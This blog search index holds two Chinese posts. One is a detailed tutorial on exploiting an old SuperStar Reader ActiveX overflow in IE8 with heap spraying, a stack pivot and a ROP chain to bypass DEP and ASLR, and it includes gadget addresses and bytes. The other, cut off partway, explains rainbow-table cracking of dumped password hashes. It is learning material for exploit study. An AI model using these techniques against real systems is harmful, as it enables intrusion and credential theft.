<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2013-08-07-HeapSpray+Rop绕过IE8的DEP防护--堆喷射技术利用超星老漏洞</title>
    <url>/2013/08/07/2013-08-07-HeapSpray-Rop%E7%BB%95%E8%BF%87IE8%E7%9A%84DEP%E9%98%B2%E6%8A%A4-%E5%A0%86%E5%96%B7%E5%B0%84%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8%E8%B6%85%E6%98%9F%E8%80%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;堆喷射技术已经发展很多个年头了，相关的研究也挺多的，虽然现在Win7、Win8系统下的利用越来越难，但是该技术仍然是可用的，比如最近新出的IE8 use after free漏洞(CVE-2013-1347)，Metasploit里的利用代码就是使用堆喷技术及ROP实现Shellcode的布置和绕过DEP防护的，网上有关的资料不多，0Day2书中有关的内容并不多，只是简单介绍了HeapSpray技术，并没有讲解如何结合ROP绕过DEP防护，在看雪上有讨论过这个漏洞在IE8上的利用，我尽量把做的过程写的详细些，细节和学习过程遇到问题的解决方案都做一下说明，本人很菜，高手飘过，如果有问题欢迎交流，希望能对学习漏洞的人有所帮助（工具及资料都会打包提供下载）
</blockquote>
<a id="more"></a>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&ensp;&ensp;&ensp;&ensp;在漏洞的利用过程中，攻击者通常利用溢出控制程序的执行过程，用来执行布置在堆栈中的ShellCode，为了应对这种威胁，微软开始在XP SP2及之后的系统中使用DEP防护措施，以禁止进程将栈和默认堆中的数据当做指令来执行，这样在堆栈中的ShellCode执行之前程序就会异常终止，IE8及之后的IE版本才支持DEP防护，WinXP默认安装的是IE6（现在很不安全），最高支持IE8，Win7系统默认安装的是IE8，Win8系统则默认安装IE10，本文主要针对WinXP的各个版本的IE及Win7系统支持DEP防护的IE8浏览器实现绕过DEP的漏洞利用:
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片1.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图1.1：IE8浏览器的DEP防护</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;这种防护可以说是目前最强力的防护措施(尤其是在结合ASLR：布局地址随机化技术之后)，相应的绕过措施也有很多种，基本都是利用ROP链执行VisualProtect、VisualAlloc等函数将ShellCode布置所在内存属性设置成可执行的，或是设置关闭DEP的参数调用ZwSetInformationProcess函数等，本文中采用ROP链调用VisualProtect函数将ShellCode所在的内存属性设置成可读写执行的方式，绕过DEP防护。

<h3 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h3><p>&ensp;&ensp;&ensp;&ensp;简单的说就是一段返回地址序列（注意不是可运行的指令，而是存放的返回地址），由于不能直接执行堆栈里布置的Shellcode数据，所以目前一般调用程序所加载的DLL模块里（ollydbg的M内存窗口可以查看加载的DLL信息）的代码达到变相执行我们的ShellCode的目的，类似于从DLL里的执行指令中拼凑出ShellCode的功能，比如A.dll里调用一部分代码，再跳转到B.dll里执行一部分代码，整体组合起来达到执行ShellCode的目的，但是将整个ShellCode拼凑出来难度很大，许多ShellCode指令对应的机器码不一定能够找到，所以一般是利用ROP执行关闭DEP的指令，再继续跳转到堆栈内的ShellCode执行，这样需要的ROP链的长度就可以大大降低了。
<p>&ensp;&ensp;&ensp;&ensp;简单的说就是一段返回地址序列（注意不是可运行的指令，而是存放的返回地址），由于不能直接执行堆栈里布置的Shellcode数据，所以目前一般调用程序所加载的DLL模块里（ollydbg的M内存窗口可以查看加载的DLL信息）的代码达到变相执行我们的ShellCode的目的，类似于从DLL里的执行指令中拼凑出ShellCode的功能，比如A.dll里调用一部分代码，再跳转到B.dll里执行一部分代码，整体组合起来达到执行ShellCode的目的，但是将整个ShellCode拼凑出来难度很大，许多ShellCode指令对应的机器码不一定能够找到，所以一般是利用ROP执行关闭DEP的指令，再继续跳转到堆栈内的ShellCode执行，这样需要的ROP链的长度就可以大大降低了。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片2.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图1.2：ROP链示意</div>
</center>
<br>&ensp;&ensp;&ensp;&ensp;图1.2是一段使用immunitydbg的插件自动获取的ROP链，由一串地址构成，右边有对应地址处指令的注释，每次执行retn时会继续执行下一条返回地址的代码（retn是把栈顶数据弹出到EIP执行，同时ESP自加，指向下一条地址，上一条指令retn执行之后就会跳转到esp指向的下一条地址处的指令）。

<h3 id="HeapSpray（堆喷射）技术："><a href="#HeapSpray（堆喷射）技术：" class="headerlink" title="HeapSpray（堆喷射）技术："></a>HeapSpray（堆喷射）技术：</h3><p>&ensp;&ensp;&ensp;&ensp;由于传统的堆栈溢出利用方式受到了微软防护措施（GS、SafeSEH、ASLR等）的限制，对于浏览器或是PDF阅读器等可以用javascript分配内存的程序，攻击者可以通过自定义的代码控制堆内存分配，将ShellCode布置到堆内存中，在发生溢出后劫持程序EIP跳到堆中执行，举个例子：用空指令Nops(PS：对程序的执行没有影响的指令，一般是nop指令，也可以是or eax 0c之类的对使用的关键寄存器影响不大的指令等)填充在ShellCode之前直到能分配1M的内存空间，连续分配200次，由于堆中空间是0地址从下向上布局的，所以程序领空的50M-200M堆空间一般会被自己的Nops+ShellCode堆块覆盖，如果劫持程序到地址0x0c0c0c0c、0x0d0d0d0d之类的指令开始执行的话，一般会先执行Nop指令，最终执行到ShellCode，所以堆喷并不用于漏洞发现，而是为了达到稳定布局ShellCode的目的，算是一种漏洞利用方式。
<p>&ensp;&ensp;&ensp;&ensp;这次试验中，以超星阅览器V4.0为例，来演示Heapspray及ROP技术的使用方式，相关的漏洞成因及IE6下无DEP防护的漏洞利用网上已经讲了很多，0day漏洞第二版、看雪自己举办的exploit竞赛里都有这个例子，控制程序执行流程比较简单（图1.3），溢出后的跳转地址为0x0c0c0c0c，之前的256字节的0x0a用于填充缓冲区。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片3.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图1.3：漏洞利用的代码</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;图1.3 漏洞利用的代码，只是简单地跳转到0x0c0c0c0c处执行，当然现在0x0c0c0c0c处还没有能够执行的代码。在此基础上HeapSpray就可以实现漏洞稳定利用，很适合做演示。下面开始正题啦O(∩_∩)O~

<h2 id="如何控制堆块的分配"><a href="#如何控制堆块的分配" class="headerlink" title="如何控制堆块的分配"></a>如何控制堆块的分配</h2><p>&ensp;&ensp;&ensp;&ensp;实验中将溢出后覆盖的返回地址设置成0x0c0c0c0c,所以0x0c0c0c0c处的数据就必须布置成空指令和ShellCode的组合，堆内存块的分配是不确定的，需要确定分配的堆块大小及分配次数才能保证正确覆盖要挑战到的地址，先以XpSp3+IE6下无DEP防护的利用代码为例（图2.1），看一下堆数据的布置
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片4.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图2.1：IE6下无DEP防护的HeapSpray漏洞利用代码</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;解释下关键代码的含义，牵扯的内容比较多：
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片5.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图2.2：nop填充</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;这两句代码最终使nops所在堆块单元占用的空间为0x100000,可能不容易理解，第一句明明是0x100000/2再减了那么多变量，这就涉及到了javascript中BSTR字符串的内存空间占用情况（很多图片摘自资料一，资料一里有关堆块的分配原理部分讲的很详细，最好是先看下，动手试下附带的代码，熟悉Windbg使用，并加深对堆块分配的理解，再看下本文后续部分，在本文中尽量但不大可能将原理完全讲清楚，原谅俺吧╮(╯_╰)╭）。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片8.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图2.3：BSTR结构</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;BSTR字符串首部占4个字节，包含字符串长度信息，后2个字节为截止符0x0000，中间部分是被转换成Unicode的字符串。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片9.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图2.3：HeapChunk结构</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;再来看一下字符串所在堆块的结构：
堆块部分除了字符串所占的空间就只包含一个首部，XpSp3的堆块占32字节的大小（XpSp2之前的堆管理结构只占16字节，后来Sp2及之后的添加了很多检测堆溢出之类的结构，在这个地方纠结过），这样也就能够清楚这个图中的减去值的含义：

<p><img src="%E5%9B%BE%E7%89%876.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;至于为什么都除以2，是和初定义nops的解码编码字符串函数unescape有关的，见var nops=unescape（“%u9090%u9090”） ，用unescape的.length去检测分配的内存块大小时实际大小是其返回值的两倍。所以最终nops字符串所在堆块占用的内存空间大小才恰恰是0x100000字节。了解了这些明白上面IE6下的漏洞利用代码（图2.1）就比较容易了：先在堆里分配200个大小为0x100000大小的内存块，一般0x0c0c0c0c处的代码就会被我们布置的空指令+ShellCode覆盖，下面触发漏洞跳转到0x0c0c0c0c处的空指令执行（如果刚好跳到ShellCode中间导致Shellcode被破坏的话算你倒霉，再来几次就好，当然这概率很小，和空指令相比ShellCode并不长），最终执行我们的ShellCode。
<p>&ensp;&ensp;&ensp;&ensp;IE6下堆内存的分配就是这样，但是在IE8下，上面的堆喷射（HeapSpray）代码并不能覆盖0x0c0c0c0c处的区域，解决办法很简单，将下图红框部分代码：

<p><img src="%E5%9B%BE%E7%89%8710.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;替换为：(其实就替换了一句。。。)

<p><img src="%E5%9B%BE%E7%89%8711.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;这样喷射代码分配的堆内存块就能覆盖0x0c0c0c0c处的堆空间了。

<h2 id="ROP链的布置"><a href="#ROP链的布置" class="headerlink" title="ROP链的布置"></a>ROP链的布置</h2><blockquote>
<p>&ensp;&ensp;&ensp;&ensp;虽然我们已经能够控制堆内存的分配,绕过DEP还是有很多关键的步骤需要实现，如ROP链的获取及布置，主要难点在于堆块加入了ROP链之后如何分配，覆盖返回地址之后怎样才能刚好从ROP链的开始处执行，做完这一步，后面那些小问题就好说了。</p>
</blockquote>
<h3 id="ROP链的获取："><a href="#ROP链的获取：" class="headerlink" title="ROP链的获取："></a>ROP链的获取：</h3><p>&ensp;&ensp;&ensp;&ensp;由于IE网页不能直接调试，可以通过在网页javascript代码中插入弹窗语句达到暂停运行的效果之后再用调试器附加，到达需慢慢跟踪的地方，比如需查看堆块分配情况等，当IE运行时的模块都加载完毕之后，就可以使用工具immunitydbg的mona插件（一个Python脚本，放置在immunity的PyCommands目录下），输入命令：“!mona rop -m 模块名.dll”，就可以在DLL文件内存空间自动搜索可用的跳转地址，稍候片刻就可以在安装目录下生成的rop_chain.txt中查看各种语言格式的ROP链，当然mona的功能不止于此，但是现在这条命令就足够了，图1.2就是通过这种方式得到的javascript格式的ROP（还需稍微修改才能够真正使用，后面会提到）。

<h3 id="ROP链的布置："><a href="#ROP链的布置：" class="headerlink" title="ROP链的布置："></a>ROP链的布置：</h3><p>&ensp;&ensp;&ensp;&ensp;为了达到绕过DEP的效果，ROP就链必须要先于ShellCode执行，如果是栈溢出且栈中能够存放ROP链的地址的话就好办了，布置在栈中比不知道堆中定位容易，将ROP的第一个地址覆盖溢出的返回地址，这样就能通过溢出的返回地址先执行ROP链地址处的指令，执行完毕之后再跳转到0x0c0c0c0c之类的地址执行就可以达到目的，偏偏超星阅览器4.0虽然是栈溢出，但是对栈中布置的数据进行了转化，不仅不能简单地将ROP布置到栈中，仅有的覆盖栈中返回地址的指令也要进行仔细选择，在演示过程中会说明选择指令的原因及对策，现在主要说如何将ROP链布置在堆中：
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片12.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图3.1 ROP的布置，可看做一个ROP+Shellcode单元</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;将ROP和紧挨着的ShellCode作为分配的堆块的一部分，ROP链地址处的指令执行完后就可以接着执行ShellCode，这里需要解决的问题是要ROP链先执行（严格意义上不是这么说的，这里及以后都指的是地址处的指令），我们需要控制返回地址精确指向ROP的开头，因为堆块是javascript语句随机分配的，所以需要ROP地址可控，来看一下现在的解决方案（图3.2）：
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片13.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图3.2 ROP的布局：达到0x0c0c0c0c总是指向ROP开头</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;ROP链相对堆块起始地址的偏移是固定的,之前的测试中，我们已经能够分配固定大小的堆块（例子是分配0x100000大小），当分配的堆块足够多的情况下，堆块的起始地址会变得固定，如图3.1所示，堆入口地址的后四位都是0018，对应的用户数据起始地址为0020，这也不是必然的，只有大量分配堆块或是使用后面提到的HeapLib进行精准堆分配时才会有这种现象，在我的测试过程中，只在最初几次实验时看到比0x0c0c0c0c低好多的堆内存空间堆块起始地址不规则的情况，但是0x0c0c0c0c所在堆块空间的起始地址的后四位总是0018。前四位的地址可能会变化，比如0x0c0c0c0c这次是处在0c0a0018开始的堆块，下次处在0c0b0018开始的堆块，这种影响可以通过重复ROP+ShellCode单元块（图3.1）消除，因为后四位0018一般是不变的，按照图3.2中ROP+ShellCode的布局，如果两个堆块间的间距为0x10000，可以每个堆块内布置10个（举例而已，具体的个数可灵活，没什么大的影响）这种nops+ROP+ShellCode+nops的单元，每个单元占0x800*2=0x1000字节，并且必须保证ROP前有(0x0c0c0c0c-xxxx0020)/2%0x1000=0x5f6个nop指令填充,这样就达到了无论0x0c0c0c0c所在堆块起始地址前4位的是多少,0x0c0c0c0c总能够指向ROP链的开头的目的（不知俺说不说的清楚，0x0c0c0c0c堆块起始地址后四位是固定的，前四位无论怎么变化，影响分配的只是0x0c0c0c0c离堆块首部地址XXXX0018（用户数据是从xxxx0020开始的）之间nops+ROP+ShellCode+nops的单元的个数不同而已（单元大小0x1000字节，0c0b0018和0c0c0018分别为堆起始地址距离0x0c0c0c0c分别有5个和0个单元）最终的分布结果总是类似于图3.2所示，当然单元大小和分配的多少都可以灵活制定）。
<p>&ensp;&ensp;&ensp;&ensp;后面的路基本上就是一片坦途了，既然0x0c0c0c0c已经能够成功指向ROP链的开头，下面就是控制溢出让ROP最先执行了，因为ROP是由一系列返回地址组成的，第一条地址就必须成为返回地址之后才能继续执行，但是溢出的时候返回地址是返回到的栈上，并不能直接把返回地址覆盖成0x0c0c0c0c，然后跳到ROP链，一是一直强调的ROP链不是指令，而是指令所在的地址，二是DEP还没有关闭，0x0c0c0c0c处的数据并不能当做指令执行，这时还需要做的就是翻转堆栈（这个地方纠结了好久，其实解决方法很简单），让ESP寄存器赋值为0x0c0c0c0c，我们布置数据的默认堆就变相成了栈空间，retn、push、pop等指令就可以想操作栈一样控制堆空间，等执行RETN操作时ROP链第一条地址被弹出到EIP寄存器，就齐活了，ROP链地址对应的指令就会顺序执行完毕关闭掉DEP，怎么翻转堆栈呢？找两处地址足矣：先将栈顶数据设成0x0c0c0c0c,再从加载的DLL里找pop eax retn、xchg esp eax retn指令的地址，分被记为retaddr1、retaddr2，控制返回地址先返回到retaddr1执行pop eax，则eax=0x0c0c0c0c，retn之后再来一把retaddr2地址处的xchg esp eax，则esp=0x0c0c0c0c，再retn就可以开始ROP链的地址处的指令了。

<h2 id="对抗WinXpSp3-IE8"><a href="#对抗WinXpSp3-IE8" class="headerlink" title="对抗WinXpSp3+IE8"></a>对抗WinXpSp3+IE8</h2><p>&ensp;&ensp;&ensp;&ensp;前面罗嗦了这么多，原理部分大致讲完了，开始对XpSp3+IE8动刀吧，还是推荐先动手试验下资料一的内容，最前面堆块分配的原理部分讲解的很详细，在实际利用过程中遇到问题的再看本文对应部分。
来看下我们最终的利用代码（图4.1）：
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图片14.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图4.1 最终的利用代码</div>
</center>
这里还有几个需要注意的地方：
<p>&ensp;&ensp;&ensp;&ensp;1.    Immunitydbg获取的ROP链很多情况下都有一些错误，必须了解ROP链的过程，对出现的错误进行修改才行，之前找的msvcrt.dll的ROP链，要改的有一处：

<p><img src="%E5%9B%BE%E7%89%8715.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;本来eax已经指向visualprotect的函数地址了（POP EAX），但是这里又加了EF，导致出错，解决的办法就是地址77be1120改成77be1131，最后AL寄存器再加0xEF的时候才变成77be1120。
<p>&ensp;&ensp;&ensp;&ensp;2.    之前我们已经分析了IE6精确分配堆块大小的算式：

<p><img src="%E5%9B%BE%E7%89%876.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;至于为什么IE8分配的时候变成了算式（变量定义的不同，主要看红框里的算式，end已经包含了ShellCode）：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory[i]=end.substring(2,end.length-0x21)</span><br></pre></td></tr></table></figure>
<p>&ensp;&ensp;&ensp;&ensp;俺也不大清楚了，只能说是前辈们总结的经验。附经验：

<p><img src="%E5%9B%BE%E7%89%8716.jpg" alt=""></p>
<p>ROP的偏移有时也是不同的，解释不了。。。经验图：</p>
<center>

<p><img src="%E5%9B%BE%E7%89%8717.jpg" alt=""></p>
</center>
<p>&ensp;&ensp;&ensp;&ensp;3.    注意3里标注的两个地址分别是pop eax；retn和xchg esp，eax；retn，注意看这两个地址的每一个字节\x1B\x71\x38\x63\x2d\x30\x3b\x63都是小于128的，因为字符串str经过了先转化为UNICODE再转化为ASCLL的操作，如果选取的地址中有大于128的字节，如\x90经过两次转化之后会变成乱码，导致原数据被破坏。Msvcrt.dll里没有适合的这种地址，选取其它DLL里的，类似XCHG ESP，EAX；RETN之类的地址可以使用OD的findaddr插件（能搜索常见的漏洞利用地址，但是不包括这个），搜索指令的机器码就可。

<h2 id="移植到Win7-IE8"><a href="#移植到Win7-IE8" class="headerlink" title="移植到Win7+IE8"></a>移植到Win7+IE8</h2><p>&ensp;&ensp;&ensp;&ensp;XpSp3的IE8搞定之后，再去搞Win7的IE8就轻松多了，看一下代码，也有几个移植时需要注意的地方，因为还需要处理Win7的ASLR（布局地址随机化），每次加载的DLL文件其基址在下次重启之后就会变化，导致我们ROP链的返回地址对应的指令也会变化，一个解决办法就是在未开启ASLR保护的DLL文件中找返回地址，一般的资料里都利用的安装java6之后IE加载的msvcr71.dll，其实安装完超星4的ACTIVEX控件之后，发生溢出的pdg2.dll也不支持ASLR保护，完全可以在pdg2.dll里找需要的返回地址构造ROP链，但是，嘿嘿嘿，从pdg2.dll里找到的ROP链也不能直接用，还在调试中，如果你能看到这几句话说明我还没有调试修改成功。就先从msvcr71.dll找需要的ROP吧，看代码：

<p><img src="%E5%9B%BE%E7%89%8718.jpg" alt=""><br>解释下实际使用需要注意的几个地方：</p>
<ol>
<li>这个地方已经在XpSp3的地方讲过了，要改的地方相同。</li>
<li>这里还是经验，XpSp3那里已经把各操作系统各IE版本堆块喷射的参数列出来了，只有before分配的那个0x5F4需要调试时再确定一下。</li>
<li>msvcr71.dll里并没有找到XCHG ESP，EAX；RETN指令的机器码，这地址是在pdg2.dll里找的，同样每一字节的值不能大于128（ASCLL能表示的范围，再转化回来不会出错）。<h2 id="漏洞稳定利用-gt-精准堆分配"><a href="#漏洞稳定利用-gt-精准堆分配" class="headerlink" title="漏洞稳定利用-&gt;精准堆分配"></a>漏洞稳定利用-&gt;精准堆分配</h2><p>&ensp;&ensp;&ensp;&ensp;前面提到了堆块的分配是随机的，起始地址可能会变化，有一定的概率导致0x0c0c0c0c不能准确的指向ROP链的开头，导致利用失败，为了精确控制堆的分配，就要用到Alexander Sotirov提出的堆风水（Heap Feng Shui）技术， heaplib javascript library用于实现，很容易使用其提供的heaplib javascript链接库来实现精准堆分配，也可以不去了解原理，掌握使用方法就行，而且就算是不使用堆精准喷射也能很好的稳定分配堆内存。
<p>&ensp;&ensp;&ensp;&ensp;heaplib链接库使用比较简单，先将定义及实现的放置在漏洞利用代码前面（只显示部分，全部代码见附件里的最终利用代码里）：

</li>
</ol>
<p><img src="%E5%9B%BE%E7%89%8719.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;分配堆块也比较简单：

<p><img src="%E5%9B%BE%E7%89%8720.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;先调用heap_obj.gc清除堆里分配的零碎堆块，再使用heap_obj.alloc函数分配所需空间即可。
<p>&ensp;&ensp;&ensp;&ensp;看下效果：

<p><img src="%E5%9B%BE%E7%89%8721.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;分配的堆块：

<p><img src="%E5%9B%BE%E7%89%8722.jpg" alt=""></p>
<h2 id="工具及资料"><a href="#工具及资料" class="headerlink" title="工具及资料"></a>工具及资料</h2><h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>&ensp;&ensp;&ensp;&ensp;Ollydbg(偏爱的)、Windbg(查看堆内存分配等)、immunitydbg(与Ollydbg类似，支持Python脚本，Mona插件需另外下载，会打包进资料里，可用于自动查找ROP链)。
<a href="工具资料打包.zip" target="_blank">下载链接</a>

<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p>&ensp;&ensp;&ensp;&ensp;exploit编写系列教程第十一篇(经典详细)
<p>&ensp;&ensp;&ensp;&ensp;实战HeapSpray之CVE2012-1889 Exploit编写
<p>&ensp;&ensp;&ensp;&ensp;[译]各种IE版本下的堆喷射技术
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>HeapSpray</tag>
        <tag>Rop</tag>
        <tag>Dep</tag>
        <tag>IE 浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>2013-10-26-彩虹表破解开机密码、MD5算法等的原理</title>
    <url>/2013/10/26/2013-10-26-%E5%BD%A9%E8%99%B9%E8%A1%A8%E7%A0%B4%E8%A7%A3%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81%E3%80%81MD5%E7%AE%97%E6%B3%95%E7%AD%89%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;或许对于大多数人来说，实际中并不需要了解这些理论，能够使用现成的工具就行，但是我个人觉得了解了这些可以将工具使用的更好，更何况理论研究中思维的碰撞也是一种乐趣。
</blockquote>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&ensp;&ensp;&ensp;&ensp;彩虹表技术以时空折中理论为基础，即增大存储空间的开销缩短密码破解所需要的时间，时空折中的相关理论在密码学中应用很广，最初是在1980年，公钥密码学的提出者之一Hellman针对DES算法提出的一种攻击方式，经过不断地改进，2003年瑞典的Philippe Oechslin 在Making a Faster Cryptanalytic Time-Memory Trade-Off一文中提出了一种高效破解windows开机密码的时空折中算法，并命名为彩虹表，当然当时是针对Windows Xp开机认证的LM-HASH算法。除了破解开机密码，彩虹表目前还应用于散列密码如SHA、MD4、MD5等算法的破译，速度快、效率高、疗效有保证，Philippe的论文中提到：“1.4G的彩虹表可以在13.6s内破解99.9%的数字字母混合型的Windows密码”，具有很强的实用性。
<a id="more"></a>

<h2 id="彩虹表的原理"><a href="#彩虹表的原理" class="headerlink" title="彩虹表的原理"></a>彩虹表的原理</h2><p>&ensp;&ensp;&ensp;&ensp;设想一下这种情况：你已经拿到了一台服务器的Shell，并且通过HashDump工具获取了主机存储的密码的Hash值，怎么据此得到明文的用户密码搞定管理员权限呢（当然提权方法很多，如直接扔进在线解密网站或是用wce、minikazi之类的工具直接搞到原始明文密码，或者干脆绕过密码提权，这里只是做个示例），有两种很容易想到的方法：一种是字典破解，二是暴力穷举，这两种方式应用的都非常广，字典破解存储常用的用户名密码和其对应的密码Hash值，破解时只需根据需要破解的密码找到对应的明文密码即可，破解速度快，但是破译效率依赖于字典的构造，并且经常需要大量的存储空间存放字典文件；暴力破解法一般比较盲目，常见的形式就是依次计算1-N位字符串的密码值与需破解的密码进行比较，成功率全靠人品。这两种方法分别对空间和时间的要求比较大，久之，人类开始寻找折中的方法，彩虹表就是时空折中的典型，下面我就以彩虹表的生成和查表这两个步骤来介绍彩虹表破解的原理。

<h3 id="造表过程"><a href="#造表过程" class="headerlink" title="造表过程"></a>造表过程</h3><p>&ensp;&ensp;&ensp;&ensp;此处仅介绍彩虹表的原理，对Hellman等人对时空折中算法的研究就不做详细介绍了，有兴趣的可以看一下Hellman在1980年发表的论文：A cryptanalytic time-memory trade-off，对理解彩虹表的构造过程会有很大帮助，Philippe Oechslin这人只是在Hellman的基础上做了稍微改进。
<p>&ensp;&ensp;&ensp;&ensp;彩虹表实质上还是属于字典破解的一种，不过不再是简单的明文—密码的对应，为了节省字典存储空间，彩虹表省去了能通过计算得出的数据，达到这点的关键在于设计出一个函数族Rk（k=1、2、3、4……）将hash密文空间映射回明文的字符空间。
<p>&ensp;&ensp;&ensp;&ensp;这么说很高端大气，一般没人听的懂，我当时也没懂神马映射、空间啥的，其实就是把hash密文再按照一定的规则转化成普通字符串的转化函数，例如字符串qshud的32位MD5密文e978c6b019ac22a3fd05b14d36621852，最简单的转化处理就是直接截取第一个字符e。因为e也可能是某些人的口令哦，再对字符e进行32位MD5运算得到密文e1671797c52e15f763380b45e841ec32，再取前两位字符e1，继续MD5运算得到cd3dc8b6cffb41e4163dcbd857ca87da，再取前三位cd3……，这时转换的函数族Rk其实就是截取密文的前k位，k=1、2、3、4…….照此法动作若干次（次数不限、本例为8次），得到5626cf5e6f1093c2840a16512f62c3b5，再取前八个字符 5626cf5e.
<p>&ensp;&ensp;&ensp;&ensp;好了，下面我们就只需要存储字符串qshud和 5626cf5e就齐活了，刚才中间的字符数据e、e1、cd3… d989670就不用管了，它们属于可以通过qshud计算出的数据，不必进行存储，需要的话稍微花些时间计算即可，亲们必须先记着这种只存储首尾字符串的存储方式，下一节查表过程会继续讲到这种存储如何配合查表过程的。
<p>&ensp;&ensp;&ensp;&ensp;上一段的例子只是针对MD5算法最简单的一种彩虹表，彩虹表可以处理的hash算法很多，进行的hash运算我们就记为H，函数族Rk（k=1、2、3、4……）都可以自定义，最初开始处理的明文再多选取一些，如图1中第一列的wikipedia、abcdefgh…passwd等，依次计算就得到了图1中的几条字符串链。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图1.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图1 简化的彩虹表造表流程图</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp; Ps：一条条的链并列的形状就像是彩虹的色带，这就是彩虹链（表）的由来。
<p>&ensp;&ensp;&ensp;&ensp; 图1的例子使用的是自定义的R1、R2、R3函数，注意可不是上例提到的截取前几个字符形式的Rk函数，只是为了便于说明图1中的彩虹表虚构出的，具体转换方式不必深究。我们最后存储的只有wikipedia-rootroot、abcdefgh-myname…passwd-linux23，这就是彩虹表造表的大致过程，为了便于说明，示例比较简单，在实际造表中还需要考虑更多的因素，如最重要的Rk系列函数构造、每一条链的长度、造表需要的空间、存储格式等等。

